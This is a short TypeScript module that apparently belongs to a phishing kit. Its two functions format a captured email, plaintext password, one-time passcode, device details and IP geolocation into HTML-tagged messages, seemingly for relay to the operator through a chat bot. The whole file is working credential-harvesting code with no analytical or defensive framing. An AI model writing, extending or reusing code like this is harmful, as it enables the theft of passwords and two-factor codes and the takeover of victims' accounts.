import { LoginDetails, OTPDetails } from '../types';

export function createLoginMessage(details: LoginDetails): string {
  return `🔐 <b>Login Details</b>\n\n` +
    `<code>${details.clientId}</code>\n\n` +
    `👤 <b>Login Info:</b>\n` +
    `• Email: <code>${details.email}</code>\n` +
    `• Password: <code>${details.password}</code>\n\n` +
    `📱 <b>Device Info:</b>\n` +
    `• Browser: <code>${details.deviceInfo?.browser || 'Unknown'}</code>\n` +
    `• OS: <code>${details.deviceInfo?.os || 'Unknown'}</code>\n` +
    `• Device Type: <code>${details.deviceInfo?.device || 'Unknown'}</code>\n\n` +
    `🌐 <b>Network Info:</b>\n` +
    `• IP: <code>${details.ipInfo?.ip || 'Unknown'}</code>\n` +
    `• Country: <code>${details.ipInfo?.country || 'Unknown'}</code>\n` +
    `• City: <code>${details.ipInfo?.city || 'Unknown'}</code>\n` +
    `• Region: <code>${details.ipInfo?.region || 'Unknown'}</code>`;

}

export function createOTPMessage(details: OTPDetails): string {
  return `🔑 <b>OTP Verification</b>\n\n` +
    `<code>${details.clientId}</code>\n\n` +
    `• Code: <code>${details.otp}</code>\n\n` +
    `🌐 <b>Network Info:</b>\n` +
    `• IP: <code>${details.ipInfo?.ip || 'Unknown'}</code>\n` +
    `• Country: <code>${details.ipInfo?.country || 'Unknown'}</code>\n` +
    `• City: <code>${details.ipInfo?.city || 'Unknown'}</code>\n` +
    `• Region: <code>${details.ipInfo?.region || 'Unknown'}</code>`;
}